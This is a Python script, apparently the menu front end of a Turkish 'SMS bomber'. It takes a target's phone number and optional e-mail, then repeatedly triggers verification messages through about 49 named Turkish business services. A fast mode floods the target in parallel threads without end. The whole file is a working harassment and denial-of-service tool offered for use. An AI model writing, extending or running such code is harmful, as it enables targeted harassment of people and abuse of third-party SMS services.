from colorama import Fore, Style
from time import sleep
from os import system
from sms import SendSms
from concurrent.futures import ThreadPoolExecutor, wait

servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value):
        if attribute.startswith('__') == False:
            servisler_sms.append(attribute)

            
while 1:
    system("cls||clear")
    print("""{}

    ░▒▓████████▓▒░ ░▒▓█▓▒░  ░▒▓███████▓▒░ ░▒▓████████▓▒░ ░▒▓█▓▒░ ░▒▓████████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░        ░▒▓█▓▒░ ░▒▓█▓▒░           ░▒▓█▓▒░     ░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░        ░▒▓█▓▒░ ░▒▓█▓▒░           ░▒▓█▓▒░     ░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓██████▓▒░   ░▒▓█▓▒░  ░▒▓██████▓▒░     ░▒▓█▓▒░     ░▒▓█▓▒░ ░▒▓██████▓▒░    ░▒▓██████▓▒░  
    ░▒▓█▓▒░        ░▒▓█▓▒░        ░▒▓█▓▒░    ░▒▓█▓▒░     ░▒▓█▓▒░ ░▒▓█▓▒░           ░▒▓█▓▒░     
    ░▒▓█▓▒░        ░▒▓█▓▒░        ░▒▓█▓▒░    ░▒▓█▓▒░     ░▒▓█▓▒░ ░▒▓█▓▒░           ░▒▓█▓▒░     
    ░▒▓█▓▒░        ░▒▓█▓▒░ ░▒▓███████▓▒░     ░▒▓█▓▒░     ░▒▓█▓▒░ ░▒▓█▓▒░           ░▒▓█▓▒░     

    """.format(Fore.RED))
    try:
        menu = (input(Fore.GREEN + "    1- Send SMS (Specified Speed)\n" + Fore.LIGHTRED_EX + "    2- Send SMS (Fast)\n" + Fore.WHITE + "    3- Exit\n\n" + Fore.LIGHTYELLOW_EX + "    Choice: "))
        if menu not in ["1", "2", "3"]:
            raise ValueError
        menu = int(menu)
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "You made a choice that doesn't exist. You are being redirected...")
        sleep(3)
        continue
    if menu == 1:
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "Write the phone number without '+90' at the beginning: "+ Fore.LIGHTGREEN_EX, end="")
        tel_no = input()
        if tel_no == "":
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "You didn't write a number. You are being redirected...")
            sleep(3)
            continue
        else:
            try:
                int(tel_no)
                if len(tel_no) != 10:
                    raise ValueError
            except ValueError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Wrong phone number! You are being redirected...") 
                sleep(3)
                continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Enter the target's e-mail address (press 'enter' if you don't know it): "+ Fore.LIGHTGREEN_EX, end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Wrong e-mail adress! You are being redirected...") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + f"How many messages you want to send: "+ Fore.LIGHTGREEN_EX, end="")
            kere = input()
            if kere:
                kere = int(kere)
            else:
                raise ValueError
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "You didn't write how many messages you wanted to send. You are being redirected...") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Type how many seconds apart you want to send a message: "+ Fore.LIGHTGREEN_EX, end="")
            aralik = input()
            if aralik:
                aralik = int(aralik)
            else:
                raise ValueError
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "You didn't write how many seconds apart you want to send a message. You are being redirected...") 
            sleep(3)
            continue
        system("cls||clear")
        sms = SendSms(tel_no, mail)
        if isinstance(kere, int):
            while sms.adet < kere:
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            if sms.adet == kere:
                                break
                            exec("sms."+attribute+"()")
                            sleep(aralik)
        print(Fore.LIGHTRED_EX + "\nPress 'enter' to return to the menu.")
        input()
    elif menu == 3:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Shutting down the app...")
        sleep(3)
        break
    elif menu == 2:
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "Write the phone number without '+90' at the beginning: "+ Fore.LIGHTGREEN_EX, end="")
        tel_no = input()
        try:
            int(tel_no)
            if len(tel_no) != 10:
                raise ValueError
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Wrong phone number! You are being redirected...") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Enter the target's e-mail address (press 'enter' if you don't know it): "+ Fore.LIGHTGREEN_EX, end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Wrong e-mail adress! You are being redirected...") 
            sleep(3)
            continue
        system("cls||clear")
        send_sms = SendSms(tel_no, mail)
        try:
            while True:
                with ThreadPoolExecutor() as executor:
                    futures = [
                        executor.submit(send_sms.Akasya),
                        executor.submit(send_sms.Akbati),
                        executor.submit(send_sms.Ayyildiz),
                        executor.submit(send_sms.Baydoner),
                        executor.submit(send_sms.Beefull),
                        executor.submit(send_sms.Bim),
                        executor.submit(send_sms.Bisu),
                        executor.submit(send_sms.Bodrum),
                        executor.submit(send_sms.Clickme),
                        executor.submit(send_sms.Dominos),
                        executor.submit(send_sms.Englishhome),
                        executor.submit(send_sms.Evidea),
                        executor.submit(send_sms.File),
                        executor.submit(send_sms.Frink),
                        executor.submit(send_sms.Happy),
                        executor.submit(send_sms.Hayatsu),
                        executor.submit(send_sms.Hey),
                        executor.submit(send_sms.Hizliecza),
                        executor.submit(send_sms.Icq),
                        executor.submit(send_sms.Ipragaz),
                        executor.submit(send_sms.Istegelsin),
                        executor.submit(send_sms.Joker),
                        executor.submit(send_sms.KahveDunyasi),
                        executor.submit(send_sms.KimGb),
                        executor.submit(send_sms.Komagene),
                        executor.submit(send_sms.Koton),
                        executor.submit(send_sms.KuryemGelsin),
                        executor.submit(send_sms.Macro),
                        executor.submit(send_sms.Metro),
                        executor.submit(send_sms.Migros),
                        executor.submit(send_sms.Naosstars),
                        executor.submit(send_sms.Paybol),
                        executor.submit(send_sms.Pidem),
                        executor.submit(send_sms.Porty),
                        executor.submit(send_sms.Qumpara),
                        executor.submit(send_sms.Starbucks),
                        executor.submit(send_sms.Suiste),
                        executor.submit(send_sms.Taksim),
                        executor.submit(send_sms.Tasdelen),
                        executor.submit(send_sms.Tasimacim),
                        executor.submit(send_sms.Tazi),
                        executor.submit(send_sms.TiklaGelsin),
                        executor.submit(send_sms.ToptanTeslim),
                        executor.submit(send_sms.Ucdortbes),
                        executor.submit(send_sms.Uysal),
                        executor.submit(send_sms.Wmf),
                        executor.submit(send_sms.Yapp),
                        executor.submit(send_sms.YilmazTicaret),
                        executor.submit(send_sms.Yuffi)
                    ]
                    wait(futures)
        except KeyboardInterrupt:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "CTRL+C combination detected. You are being redirected...")
            sleep(2)